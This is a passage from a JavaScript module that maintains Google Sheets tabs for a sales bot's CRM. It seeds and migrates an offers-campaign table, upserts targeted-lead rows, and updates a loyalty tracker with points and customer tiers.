    // History) to an already-initialized sheet gets backfilled automatically
    // on the next restart instead of silently missing its header forever.
    const values = (result.data.values && result.data.values[0]) || [];
    if (values.length < headers.length) {
      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range,
          valueInputOption: 'RAW',
          requestBody: { values: [headers] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Header row created/updated for "${sheetName}" tab.`);
    }
  } catch (err) {
    logger.error(`Could not verify/create header row for "${sheetName}" tab.`, err);
  }
}

// --- CRM/campaign tracker (2026-07-30) ---

async function ensureCrmTabs() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const existingTitles = (meta.data.sheets || []).map((s) => s.properties.title);

  const requests = [];
  if (!existingTitles.includes(TARGETED_CLIENTS_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: TARGETED_CLIENTS_SHEET_NAME } } });
  }
  if (!existingTitles.includes(OFFERS_CAMPAIGN_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: OFFERS_CAMPAIGN_SHEET_NAME } } });
  }
  if (!existingTitles.includes(CONFIRMED_ORDERS_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: CONFIRMED_ORDERS_SHEET_NAME } } });
  }
  if (!existingTitles.includes(FEEDBACK_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: FEEDBACK_SHEET_NAME } } });
  }
  if (!existingTitles.includes(TRUSTED_CLIENTS_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: TRUSTED_CLIENTS_SHEET_NAME } } });
  }
  if (!existingTitles.includes(UNLISTED_PRODUCT_REQUESTS_SHEET_NAME)) {
    requests.push({ addSheet: { properties: { title: UNLISTED_PRODUCT_REQUESTS_SHEET_NAME } } });
  }
  if (requests.length > 0) {
    await sheetsClient.spreadsheets.batchUpdate(
      { spreadsheetId: config.googleSheetId, requestBody: { requests } },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.info(`Created Google Sheet tab(s): ${requests.map((r) => r.addSheet.properties.title).join(', ')}`);
  }

  await ensureHeaderRow(TARGETED_CLIENTS_SHEET_NAME, TARGETED_CLIENTS_HEADERS);
  await ensureHeaderRow(CONFIRMED_ORDERS_SHEET_NAME, CONFIRMED_ORDERS_HEADERS);
  await ensureHeaderRow(FEEDBACK_SHEET_NAME, FEEDBACK_HEADERS);
  await ensureHeaderRow(UNLISTED_PRODUCT_REQUESTS_SHEET_NAME, UNLISTED_PRODUCT_REQUESTS_HEADERS);
  await ensureTrustedClientsSchema();
  await ensureOffersCampaignSeeded();
}

// Writes the 5-offer table the FIRST time (when A1 is empty), and migrates
// it in place the first startup after this table format was introduced
// (when A1 still holds the OLD layout's 'CAMPAIGN_STATUS' label) — never
// touches it again once the new headers are in place, so the owner's live
// edits are never clobbered by a redeploy. The old layout held exactly one
// live campaign in fixed cells (A1/B1 = CAMPAIGN_STATUS, A2/B2 = OFFER_TEXT,
// etc.) — migrating must not silently drop whatever was running, so that
// campaign is carried over verbatim into Offer 1 rather than reset to blank/
// PAUSE like the other 4 new slots.
// 2026-08-04 fix: this used to only run inline inside the one-time
// old-panel-to-new-table migration below — once that migration had happened
// once (which it already had, live), this never ran again on any later
// restart. Meanwhile the tab's grid kept getting manually shrunk back down
// in the Sheet UI (confirmed twice now: 2026-08-02 and again as of
// 2026-08-04), silently breaking the heartbeat write every single tick with
// no self-healing. Also fixes a stale assumption in the old inline version:
// the heartbeat lives in column I (OFFERS_CAMPAIGN_HEARTBEAT_CELL), not H,
// so it needs at least 9 columns, not 8 — confirmed live 2026-08-04 that an
// 8-column grid still isn't wide enough. Called unconditionally on every
// ensureOffersCampaignSeeded() run (i.e. every startup) so a manual shrink
// is corrected on the next restart instead of needing another one-off fix.
async function ensureOffersCampaignGridWide(sheetMeta) {
  if (!sheetMeta) return;
  const gridProps = sheetMeta.properties.gridProperties || {};
  const requiredColumns = 9; // A..G table + column I heartbeat (H left as a spacer)
  const requiredRows = OFFERS_CAMPAIGN_OFFER_COUNT + 1;
  if ((gridProps.columnCount || 0) >= requiredColumns && (gridProps.rowCount || 0) >= requiredRows) return;

  await sheetsClient.spreadsheets.batchUpdate(
    {
      spreadsheetId: config.googleSheetId,
      requestBody: {
        requests: [
          {
            updateSheetProperties: {
              properties: {
                sheetId: sheetMeta.properties.sheetId,
                gridProperties: {
                  columnCount: Math.max(gridProps.columnCount || 0, requiredColumns),
                  rowCount: Math.max(gridProps.rowCount || 0, requiredRows),
                },
              },
              fields: 'gridProperties.columnCount,gridProperties.rowCount',
            },
          },
        ],
      },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.info(`Widened "${OFFERS_CAMPAIGN_SHEET_NAME}" grid to at least ${requiredColumns} columns / ${requiredRows} rows (heartbeat cell needs column I).`);
}

async function ensureOffersCampaignSeeded() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === OFFERS_CAMPAIGN_SHEET_NAME);
  await ensureOffersCampaignGridWide(sheetMeta);

  const result = await sheetsClient.spreadsheets.values.get(
    { spreadsheetId: config.googleSheetId, range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A1:G5` },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  const rows = result.data.values || [];
  const cell = (r, c) => (rows[r] && rows[r][c]) || '';
  const a1 = cell(0, 0);

  if (a1 === OFFERS_CAMPAIGN_HEADERS[0]) {
    // Already on the new table layout — never touch the data rows again so
    // the owner's live edits survive a redeploy. Still backfill a trailing
    // header cell if OFFERS_CAMPAIGN_HEADERS has grown since this sheet was
    // migrated (2026-08-02: added 'Product ID' as a 7th column) — same
    // "grow, never shrink or reorder" pattern as ensureHeaderRow(), just
    // applied to this table's own bespoke header row since its migration
    // logic doesn't go through that shared helper.
    const headerRow = rows[0] || [];
    if (headerRow.length < OFFERS_CAMPAIGN_HEADERS.length) {
      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A1:${columnLetter(OFFERS_CAMPAIGN_HEADERS.length)}1`,
          valueInputOption: 'RAW',
          requestBody: { values: [OFFERS_CAMPAIGN_HEADERS] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`Backfilled new header column(s) for "${OFFERS_CAMPAIGN_SHEET_NAME}" (now: ${OFFERS_CAMPAIGN_HEADERS.join(', ')}).`);
    }
    return;
  }

  const isOldPanel = a1 === 'CAMPAIGN_STATUS';
  const migratedStatus = isOldPanel && cell(0, 1).trim().toUpperCase() === 'PUSH' ? 'PUSH' : 'PAUSE';
  const migratedOfferText = isOldPanel ? cell(1, 1) : '';
  const migratedLastTestSentAt = isOldPanel ? cell(3, 1) : '';
  const migratedLastTickAt = isOldPanel ? cell(4, 1) : '';

  // Grid-widen already happened unconditionally above (ensureOffersCampaignGridWide) —
  // this migration branch only needs the sheet metadata for the data-writing
  // requests below, not another widen pass.
  const tableRows = [OFFERS_CAMPAIGN_HEADERS];
  for (let i = 1; i <= OFFERS_CAMPAIGN_OFFER_COUNT; i += 1) {
    if (i === 1) {
      tableRows.push([
        'OFFER_1',
        isOldPanel ? 'العرض الحالي (تم ترحيله تلقائياً)' : 'Offer 1',
        migratedOfferText,
        migratedStatus,
        '',
        migratedLastTestSentAt,
        '', // Product ID — left blank on migration; the owner links a real catalog SKU per offer as needed
      ]);
    } else {
      tableRows.push([`OFFER_${i}`, `Offer ${i}`, '', 'PAUSE', '', '', '']);
    }
  }

  await sheetsClient.spreadsheets.values.update(
    {
      spreadsheetId: config.googleSheetId,
      range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A1:G${OFFERS_CAMPAIGN_OFFER_COUNT + 1}`,
      valueInputOption: 'RAW',
      requestBody: { values: tableRows },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  await sheetsClient.spreadsheets.values.update(
    {
      spreadsheetId: config.googleSheetId,
      range: `${OFFERS_CAMPAIGN_SHEET_NAME}!I1:I2`,
      valueInputOption: 'RAW',
      requestBody: { values: [['LAST_CAMPAIGN_TICK_AT'], [migratedLastTickAt]] },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );

  logger.success(
    isOldPanel
      ? `Migrated "${OFFERS_CAMPAIGN_SHEET_NAME}" from the single control panel to the 5-offer table — the previously live campaign (status ${migratedStatus}) was preserved as Offer 1.`
      : `Seeded "${OFFERS_CAMPAIGN_SHEET_NAME}" with ${OFFERS_CAMPAIGN_OFFER_COUNT} blank offer rows (all PAUSE).`
  );
}

// Array of { rowNumber, offerId, offerName, offerText, campaignStatus,
// testTrigger, lastTestSentAt, productId } — one per offer row. Read fresh
// every call, deliberately not cached, since the whole point is the owner
// can change these live in the sheet and have the worker notice within one
// cycle.
async function getOffersCampaignRows() {
  if (!enabled) return [];
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A2:G${OFFERS_CAMPAIGN_OFFER_COUNT + 1}` },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const values = result.data.values || [];
  return values.map((row, i) => ({
    rowNumber: i + 2,
    offerId: row[0] || '',
    offerName: row[1] || '',
    offerText: row[2] || '',
    campaignStatus: (row[3] || 'PAUSE').trim().toUpperCase(),
    testTrigger: (row[4] || '').trim().toUpperCase(),
    lastTestSentAt: row[5] || '',
    productId: (row[6] || '').trim(),
  }));
}

// Resets to 'IDLE', not blank — matches the TEST_TRIGGER dropdown's two
// valid values (SEND/IDLE) added by formatOffersCampaignTable() below, so
// the cell always shows a clean dropdown state after a test fires.
async function clearOfferTestTrigger(rowNumber) {
  if (!enabled) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${OFFERS_CAMPAIGN_SHEET_NAME}!E${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [['IDLE']] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

async function setOfferLastTestSentAt(rowNumber, iso) {
  if (!enabled) return;
  try {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${OFFERS_CAMPAIGN_SHEET_NAME}!F${rowNumber}`,
          valueInputOption: 'RAW',
          requestBody: { values: [[iso]] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  } catch (err) {
    logger.error(`Could not write LAST_TEST_SENT_AT for Offers_Campaign row ${rowNumber}.`, err);
  }
}

async function setLastCampaignTickAt(iso) {
  if (!enabled) return;
  try {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${OFFERS_CAMPAIGN_SHEET_NAME}!${OFFERS_CAMPAIGN_HEARTBEAT_CELL}`,
          valueInputOption: 'RAW',
          requestBody: { values: [[iso]] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  } catch (err) {
    logger.error('Could not write LAST_CAMPAIGN_TICK_AT to Offers_Campaign.', err);
  }
}

// One row per targeted lead; small scale (dozens, not thousands) so this
// reads the whole tab fresh each call rather than maintaining a persistent
// row-number cache the way the much higher-volume Leads sheet does.
async function getTargetedClientsRows() {
  if (!enabled) return [];
  const range = `${TARGETED_CLIENTS_SHEET_NAME}!A2:${columnLetter(TARGETED_CLIENTS_HEADERS.length)}`;
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get({ spreadsheetId: config.googleSheetId, range }, { timeout: REQUEST_TIMEOUT_MS })
  );
  const values = result.data.values || [];
  return values.map((row, i) => ({
    rowNumber: i + 2,
    phoneNumber: row[0] || '',
    chatId: row[1] || '',
    customerName: row[2] || '',
    category: row[3] || '',
    campaignStatus: row[4] || '',
    leadSource: row[5] || '',
    recencyTier: row[6] || '',
    touches: parseInt(row[7], 10) || 0,
    objectionReason: row[8] || '',
    optOut: (row[9] || '').toUpperCase() === 'TRUE',
    lastMessageDate: row[10] || '',
    sentAt: row[11] || '',
    repliedAt: row[12] || '',
    orderedAt: row[13] || '',
    offerSent: row[14] || '',
    botPaused: (row[15] || '').toUpperCase() === 'TRUE',
    sendNow: (row[16] || '').toUpperCase() === 'TRUE',
    blocked: (row[17] || '').toUpperCase() === 'TRUE',
  }));
}

// Upserts by Chat ID (column B) — inserts a new row if the chatId isn't
// present yet, otherwise patches only the given fields on the existing row.
async function upsertTargetedClient(chatId, fields) {
  if (!enabled) return;
  const rows = await getTargetedClientsRows();
  const existing = rows.find((r) => r.chatId === chatId);

  const merged = {
    phoneNumber: '',
    chatId,
    customerName: '',
    category: '',
    campaignStatus: 'ON_HOLD',
    leadSource: '',
    recencyTier: '',
    touches: 0,
    objectionReason: '',
    optOut: false,
    lastMessageDate: '',
    sentAt: '',
    repliedAt: '',
    orderedAt: '',
    offerSent: '',
    botPaused: false,
    sendNow: false,
    blocked: false,
    ...(existing || {}),
    ...fields,
  };
  const values = [
    sanitizeForSheetCell(merged.phoneNumber),
    sanitizeForSheetCell(merged.chatId),
    sanitizeForSheetCell(merged.customerName),
    sanitizeForSheetCell(merged.category),
    sanitizeForSheetCell(merged.campaignStatus),
    sanitizeForSheetCell(merged.leadSource),
    sanitizeForSheetCell(merged.recencyTier),
    merged.touches,
    sanitizeForSheetCell(merged.objectionReason),
    merged.optOut ? 'TRUE' : 'FALSE',
    sanitizeForSheetCell(merged.lastMessageDate),
    sanitizeForSheetCell(merged.sentAt),
    sanitizeForSheetCell(merged.repliedAt),
    sanitizeForSheetCell(merged.orderedAt),
    sanitizeForSheetCell(merged.offerSent),
    merged.botPaused ? 'TRUE' : 'FALSE',
    merged.sendNow ? 'TRUE' : 'FALSE',
    merged.blocked ? 'TRUE' : 'FALSE',
  ];

  if (existing) {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${TARGETED_CLIENTS_SHEET_NAME}!A${existing.rowNumber}:${columnLetter(TARGETED_CLIENTS_HEADERS.length)}${existing.rowNumber}`,
          valueInputOption: 'USER_ENTERED',
          requestBody: { values: [values] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  } else {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.append(
        {
          spreadsheetId: config.googleSheetId,
          range: `${TARGETED_CLIENTS_SHEET_NAME}!A:${columnLetter(TARGETED_CLIENTS_HEADERS.length)}`,
          valueInputOption: 'USER_ENTERED',
          insertDataOption: 'INSERT_ROWS',
          requestBody: { values: [values] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
  }
}

// --- Trusted_Clients (2026-08-10 loyalty-tracker redesign) ---

// One-time (idempotent) header migration — see the long comment above
// TRUSTED_CLIENTS_SHEET_NAME for why this can't just be another
// ensureHeaderRow() call, which only ever GROWS a header and never
// replaces/shrinks one (fine for a pure column addition, not enough on its
// own for the original 11-column -> 6-column redesign this replaced, which
// genuinely shrank the shape). Three cases, checked in order:
//  1. Header already matches TRUSTED_CLIENTS_HEADERS exactly -> no-op.
//  2. Header is a strict PREFIX of TRUSTED_CLIENTS_HEADERS (every existing
//     column matches the current schema at the same position, just fewer
//     trailing columns — e.g. the 2026-08-10 Last Order Date/Customer Tier
//     addition) -> append only the missing trailing columns. Safe
//     regardless of whether real data rows already exist, since no existing
//     column is touched.
//  3. Anything else (a genuinely different/incompatible old shape, e.g. the
//     original 11-column full-row-copy design) -> only auto-rewrite the
//     whole header if row 2 is confirmed empty (no real data under that old
//     shape yet); otherwise log and back off rather than risk discarding
//     rows — that scenario needs a real migration, not an auto-rewrite.
async function ensureTrustedClientsSchema() {
  if (!enabled) return;
  try {
    const headerRange = `${TRUSTED_CLIENTS_SHEET_NAME}!A1:Z1`;
    const headerResult = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: headerRange },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const existingHeader = (headerResult.data.values && headerResult.data.values[0]) || [];
    const alreadyCurrent =
      existingHeader.length === TRUSTED_CLIENTS_HEADERS.length && TRUSTED_CLIENTS_HEADERS.every((h, i) => existingHeader[i] === h);
    if (alreadyCurrent) return;

    const isPureAddition =
      existingHeader.length > 0 &&
      existingHeader.length < TRUSTED_CLIENTS_HEADERS.length &&
      existingHeader.every((h, i) => TRUSTED_CLIENTS_HEADERS[i] === h);
    if (isPureAddition) {
      const newColumns = TRUSTED_CLIENTS_HEADERS.slice(existingHeader.length);
      await sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${TRUSTED_CLIENTS_SHEET_NAME}!${columnLetter(existingHeader.length + 1)}1:${columnLetter(TRUSTED_CLIENTS_HEADERS.length)}1`,
          valueInputOption: 'RAW',
          requestBody: { values: [newColumns] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      logger.info(`"${TRUSTED_CLIENTS_SHEET_NAME}" header extended with: ${newColumns.join(', ')}.`);
      return;
    }

    if (existingHeader.length > 0) {
      const dataCheck = await sheetsClient.spreadsheets.values.get(
        { spreadsheetId: config.googleSheetId, range: `${TRUSTED_CLIENTS_SHEET_NAME}!A2:A2` },
        { timeout: REQUEST_TIMEOUT_MS }
      );
      if (dataCheck.data.values && dataCheck.data.values.length > 0) {
        logger.error(
          `"${TRUSTED_CLIENTS_SHEET_NAME}" has existing data under an incompatible header shape — refusing to auto-rewrite the header. Needs a manual migration.`
        );
        return;
      }
    }

    // Clear the old header's full width first so no stale label (e.g. the
    // old "Order Status"/"Invoice Link") is left dangling past the new
    // schema's last column.
    await sheetsClient.spreadsheets.values.clear(
      { spreadsheetId: config.googleSheetId, range: headerRange },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    await sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${TRUSTED_CLIENTS_SHEET_NAME}!A1:${columnLetter(TRUSTED_CLIENTS_HEADERS.length)}1`,
        valueInputOption: 'RAW',
        requestBody: { values: [TRUSTED_CLIENTS_HEADERS] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.info(`"${TRUSTED_CLIENTS_SHEET_NAME}" header set to the loyalty-tracker schema.`);
  } catch (err) {
    logger.error(`Could not verify/migrate "${TRUSTED_CLIENTS_SHEET_NAME}" header.`, err);
  }
}

async function getTrustedClientsRows() {
  if (!enabled) return [];
  const range = `${TRUSTED_CLIENTS_SHEET_NAME}!A2:${columnLetter(TRUSTED_CLIENTS_HEADERS.length)}`;
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get({ spreadsheetId: config.googleSheetId, range }, { timeout: REQUEST_TIMEOUT_MS })
  );
  const values = result.data.values || [];
  return values.map((row, i) => ({
    rowNumber: i + 2,
    customerName: row[0] || '',
    phone: row[1] || '',
    address: row[2] || '',
    totalLifetimeSpent: parseFloat(row[3]) || 0,
    points: parseFloat(row[4]) || 0,
    numberOfPurchases: parseInt(row[5], 10) || 0,
    lastOrderDate: row[6] || '',
    customerTier: row[7] || '',
  }));
}

// Round to 2dp — accumulating floating-point EGP amounts across many orders
// (e.g. repeated 0.1-style fractions) can otherwise drift into ugly
// long-tail decimals in the Sheet.
function round2(n) {
  return Math.round((n + Number.EPSILON) * 100) / 100;
}

// Records one delivered order's loyalty contribution — called from
// orderPipeline.js's runOrderDeliveredCheck the first time a Confirmed_Orders
// row is observed as Delivered. `orderTotal` must already be the
// shipping-inclusive total for THIS order (the caller computes that; this
// function only accumulates the number it's given — see orderPipeline.js
// for why the shipping fee has to be computed there, not here).
//
// Upserts by Phone Number: a brand-new phone gets a new row seeded from this
// one order (Number of Purchases=1, Total Lifetime Spent=Points=orderTotal).
// A phone that already has a row is updated in place — never a second row —
// with Number of Purchases +1, Total Lifetime Spent and Points both
// increased by orderTotal (1 EGP = LOYALTY_POINTS_PER_EGP point), and
// Address overwritten with this order's address (so the tab always reflects
// the customer's most recently delivered-to address). Customer Name is only
// overwritten when a non-empty one is supplied, so a blank name on some
// later order can never blank out a name already on file. `orderDate`
// (the Confirmed_Orders row's own order date) always overwrites Last Order
// Date — by definition this call is always about the customer's newest
// known order. Customer Tier is always recomputed from the fresh purchase
// count (see computeCustomerTier) — never staff-typed, so it can't drift.
async function upsertTrustedClient({ customerName, phone, address, orderTotal, orderDate }) {
  if (!enabled || !phone) return null;

  const existingRows = await getTrustedClientsRows();
  const existing = existingRows.find((r) => r.phone === phone);
  const addedAmount = Number.isFinite(orderTotal) ? orderTotal : 0;
  const addedPoints = round2(addedAmount * LOYALTY_POINTS_PER_EGP);
  const numberOfPurchases = (existing ? existing.numberOfPurchases : 0) + 1;

  const merged = existing
    ? {
        customerName: customerName || existing.customerName,
        phone,
        address: address || existing.address,
        totalLifetimeSpent: round2(existing.totalLifetimeSpent + addedAmount),
        points: round2(existing.points + addedPoints),
        numberOfPurchases,
        lastOrderDate: orderDate || existing.lastOrderDate,
        customerTier: computeCustomerTier(numberOfPurchases),
      }
    : {
        customerName: customerName || '',
        phone,
        address: address || '',
        totalLifetimeSpent: round2(addedAmount),
        points: round2(addedPoints),
        numberOfPurchases,
        lastOrderDate: orderDate || '',
        customerTier: computeCustomerTier(numberOfPurchases),
      };

  const values = sanitizeRowForSheet([
    merged.customerName,
    merged.phone,
    merged.address,
    merged.totalLifetimeSpent,
    merged.points,
    merged.numberOfPurchases,
    merged.lastOrderDate,
    merged.customerTier,
  ]);

  if (existing) {
    await sheetsCall(() =>
      sheetsClient.spreadsheets.values.update(
        {
          spreadsheetId: config.googleSheetId,
          range: `${TRUSTED_CLIENTS_SHEET_NAME}!A${existing.rowNumber}:${columnLetter(TRUSTED_CLIENTS_HEADERS.length)}${existing.rowNumber}`,
          valueInputOption: 'USER_ENTERED',
          requestBody: { values: [values] },
        },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
    logger.success(
      `Trusted_Clients loyalty stats updated for ${phone} (row ${existing.rowNumber}): purchases=${merged.numberOfPurchases}, lifetimeSpent=${merged.totalLifetimeSpent}, points=${merged.points}, tier=${merged.customerTier}.`
    );
    return { rowNumber: existing.rowNumber, updated: true, ...merged };
  }

  const appendResult = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${TRUSTED_CLIENTS_SHEET_NAME}!A:${columnLetter(TRUSTED_CLIENTS_HEADERS.length)}`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: [values] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const newRowNumber = extractRowNumber(appendResult.data.updates && appendResult.data.updates.updatedRange);
  logger.success(`Trusted_Clients row added for ${phone} (row ${newRowNumber}): purchases=1, lifetimeSpent=${merged.totalLifetimeSpent}, points=${merged.points}, tier=${merged.customerTier}.`);
  return { rowNumber: newRowNumber, updated: false, ...merged };
}

// One-time visual polish (2026-07-30) — dropdowns + color-coded conditional
// formatting so CAMPAIGN_STATUS/TEST_TRIGGER read as an obvious control panel
// at a glance, not a plain data grid. Preserves whatever the owner has
// already typed into CAMPAIGN_STATUS (B1) and OFFER_TEXT (B2) — only
// refreshes labels/notes/styling and normalizes a still-blank TEST_TRIGGER
// to 'IDLE'. Not called automatically on startup (purely cosmetic, no need
// to redo it every restart) — run manually when re-styling is wanted.
async function formatOffersCampaignTable() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === OFFERS_CAMPAIGN_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${OFFERS_CAMPAIGN_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const hasExistingBanding = Boolean(sheetMeta.bandedRanges && sheetMeta.bandedRanges.length > 0);
  const lastDataRow = OFFERS_CAMPAIGN_OFFER_COUNT + 1; // header + 5 offers = row 6

  // Normalize CAMPAIGN_STATUS/TEST_TRIGGER to the dropdowns' valid values
  // before the strict dropdown validation below is applied, same reasoning
  // as the old single-panel version: a blank cell would otherwise show as an
  // "invalid value" warning the very first time this runs.
  const offers = await getOffersCampaignRows();
  const normalized = offers.map((o) => [
    o.offerId,
    o.offerName,
    o.offerText,
    o.campaignStatus === 'PUSH' ? 'PUSH' : 'PAUSE',
    o.testTrigger === 'SEND' ? 'SEND' : 'IDLE',
    o.lastTestSentAt,
    o.productId,
  ]);
  await sheetsClient.spreadsheets.values.update(
    {
      spreadsheetId: config.googleSheetId,
      range: `${OFFERS_CAMPAIGN_SHEET_NAME}!A2:G${lastDataRow}`,
      valueInputOption: 'RAW',
      requestBody: { values: normalized },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );

  const statusColRange = { sheetId, startRowIndex: 1, endRowIndex: lastDataRow, startColumnIndex: 3, endColumnIndex: 4 }; // D2:D6
  const testTriggerColRange = { sheetId, startRowIndex: 1, endRowIndex: lastDataRow, startColumnIndex: 4, endColumnIndex: 5 }; // E2:E6
  const offerTextColRange = { sheetId, startRowIndex: 1, endRowIndex: lastDataRow, startColumnIndex: 2, endColumnIndex: 3 }; // C2:C6

  const dropdown = (range, values) => ({
    setDataValidation: {
      range,
      rule: { condition: { type: 'ONE_OF_LIST', values: values.map((v) => ({ userEnteredValue: v })) }, showCustomUi: true, strict: true },
    },
  });
  const colorRule = (range, textValue, bg, index) => ({
    addConditionalFormatRule: {
      rule: {
        ranges: [range],
        booleanRule: {
          condition: { type: 'TEXT_EQ', values: [{ userEnteredValue: textValue }] },
          format: { backgroundColor: bg, textFormat: { foregroundColor: { red: 1, green: 1, blue: 1 }, bold: true } },
        },
      },
      index,
    },
  });

  const green = { red: 0.2, green: 0.66, blue: 0.33 };
  const gray = { red: 0.55, green: 0.55, blue: 0.55 };

  const requests = [
    ...dataTableStyleRequests(sheetId, OFFERS_CAMPAIGN_HEADERS.length, hasExistingBanding),
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 0, endIndex: 1 }, properties: { pixelSize: 90 }, fields: 'pixelSize' } },
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 1, endIndex: 2 }, properties: { pixelSize: 140 }, fields: 'pixelSize' } },
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 2, endIndex: 3 }, properties: { pixelSize: 480 }, fields: 'pixelSize' } },
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 6, endIndex: 7 }, properties: { pixelSize: 140 }, fields: 'pixelSize' } }, // G: Product ID
    { updateDimensionProperties: { range: { sheetId, dimension: 'COLUMNS', startIndex: 8, endIndex: 9 }, properties: { pixelSize: 220 }, fields: 'pixelSize' } }, // I: heartbeat panel
    {
      repeatCell: {
        range: offerTextColRange,
        cell: { userEnteredFormat: { wrapStrategy: 'WRAP', verticalAlignment: 'TOP' } },
        fields: 'userEnteredFormat(wrapStrategy,verticalAlignment)',
      },
    },
    // Heartbeat side panel (I1 label / I2 value, column H left blank as a
    // visual gap) — small italic note so it reads as an intentional
    // worker-health readout, not stray data.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 0, endRowIndex: 1, startColumnIndex: 8, endColumnIndex: 9 },
        cell: { userEnteredFormat: { textFormat: { italic: true, bold: true, fontSize: 9, foregroundColor: { red: 0.4, green: 0.4, blue: 0.4 } } } },
        fields: 'userEnteredFormat(textFormat)',
      },
    },
    dropdown(statusColRange, ['PAUSE', 'PUSH']),
    dropdown(testTriggerColRange, ['SEND', 'IDLE']),
    colorRule(statusColRange, 'PUSH', green, 0),
    colorRule(statusColRange, 'PAUSE', gray, 1),
    colorRule(testTriggerColRange, 'SEND', green, 2),
    colorRule(testTriggerColRange, 'IDLE', gray, 3),
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${OFFERS_CAMPAIGN_SHEET_NAME}" as a ${OFFERS_CAMPAIGN_OFFER_COUNT}-offer table (dropdowns + color coding applied).`);
}

const CAMPAIGN_STATUS_COLORS = [
  ['ON_HOLD', { red: 0.55, green: 0.55, blue: 0.55 }],
  ['PENDING', { red: 0.95, green: 0.61, blue: 0.07 }],
  ['OFFER_SENT', { red: 0.26, green: 0.52, blue: 0.96 }],
  ['REPLIED', { red: 0.3, green: 0.69, blue: 0.31 }],
  ['ORDERED', { red: 0.08, green: 0.34, blue: 0.13 }],
  ['DECLINED', { red: 0.83, green: 0.18, blue: 0.18 }],
  // 2026-08-02 audit fix: campaignWorker.js's classifyLeadForCampaign()
  // auto-reclassifies a PENDING row into this status when its objectionReason
  // is flagged for specialist/non-sales follow-up — never auto-messaged,
  // needs a human to actually reach out. Distinct purple so it stands out
  // from the campaign-flow statuses above.
  ['NEEDS_HUMAN_REVIEW', { red: 0.5, green: 0.2, blue: 0.6 }],
];

// Pure formatting — never touches cell content (unlike
// formatOffersCampaignPanel, which also refreshes labels/notes). Safe to
// re-run anytime without risk to the 34 already-seeded leads or any status
// changes the owner has made since.
async function formatTargetedClientsTab() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
